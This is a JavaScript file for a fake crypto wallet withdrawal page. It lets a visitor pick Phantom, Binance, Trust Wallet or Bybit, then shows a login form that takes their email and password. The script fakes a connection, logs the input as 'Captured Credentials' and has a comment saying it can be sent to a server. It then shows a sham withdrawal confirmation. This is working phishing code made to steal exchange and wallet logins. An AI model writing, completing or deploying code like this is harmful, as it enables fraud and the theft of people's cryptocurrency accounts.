document.addEventListener('DOMContentLoaded', () => {
 // DOM Elements
 const withdrawBtn = document.getElementById('withdrawBtn');
 const loginSection = document.getElementById('loginSection');
 const withdrawSection = document.getElementById('withdrawSection');
 const loginForm = document.getElementById('loginForm');
 const walletOptions = document.querySelectorAll('.wallet-option');
 const walletTypeSelect = document.getElementById('walletType');
 const confirmWithdrawBtn = document.getElementById('confirmWithdrawBtn');
 const toast = document.getElementById('toast');
 const walletNameEl = document.getElementById('walletName');
 const walletLogoEl = document.getElementById('walletLogo');

 // State
 let currentWalletType = 'phantom';

 // 1. Handle Wallet Selection (Identify which wallet)
 walletOptions.forEach(option => {
 option.addEventListener('click', () => {
 // Remove selected class from all
 walletOptions.forEach(opt => opt.classList.remove('selected'));
 // Add selected to clicked
 option.classList.add('selected');
 // Update state
 currentWalletType = option.dataset.type;
 // Update dropdown
 walletTypeSelect.value = currentWalletType;
 });
 });

 // 2. Handle Withdraw Button Click
 withdrawBtn.addEventListener('click', () => {
 // Show login section
 loginSection.style.display = 'block';
 // Scroll to login
 loginSection.scrollIntoView({ behavior: 'smooth' });
 });

 // 3. Handle Login Form Submission (Capture Details)
 loginForm.addEventListener('submit', (e) => {
 e.preventDefault();

 // Capture Data
 const email = document.getElementById('loginEmail').value;
 const password = document.getElementById('loginPass').value;
 const selectedWallet = document.getElementById('walletType').value;

 // Simulate processing
 const btn = document.querySelector('.btn-submit');
 const originalText = btn.innerText;
 btn.innerText = 'Connecting...';
 btn.disabled = true;

 setTimeout(() => {
 // Success: Hide Login, Show Withdraw
 loginSection.style.display = 'none';
 withdrawSection.style.display = 'block';
 withdrawSection.scrollIntoView({ behavior: 'smooth' });

 // Restore button
 btn.innerText = originalText;
 btn.disabled = false;

 // Log captured data (You can send this to your server/database)
 console.log('Captured Credentials:', {
 walletType: selectedWallet,
 email: email,
 password: password
 });

 }, 1500);
 });

 // 4. Handle Withdraw Confirmation
 confirmWithdrawBtn.addEventListener('click', () => {
 // Show Toast Notification
 toast.classList.add('show');

 // Simulate Flashing the App
 if (currentWalletType === 'phantom') {
 console.log('Opening Phantom Wallet...');
 // In a real scenario, you would trigger a deep link here:
 // window.location.href = 'phantom://';
 } else if (currentWalletType === 'binance') {
 console.log('Opening Binance App...');
 // window.location.href = 'https://www.binance.com/app-download';
 } else if (currentWalletType === 'trust') {
 console.log('Opening Trust Wallet...');
 // window.location.href = 'https://trustwallet.com/download';
 } else if (currentWalletType === 'bybit') {
 console.log('Opening Bybit App...');
 // window.location.href = 'https://www.bybit.com/app-download';
 }

 // Hide Toast after 3 seconds
 setTimeout(() => {
 toast.classList.remove('show');
 // Reset the view to the main dashboard
 withdrawSection.style.display = 'none';
 loginSection.style.display = 'none';
 // Scroll back to top
 window.scrollTo({ top: 0, behavior: 'smooth' });
 }, 3000);
 });
});
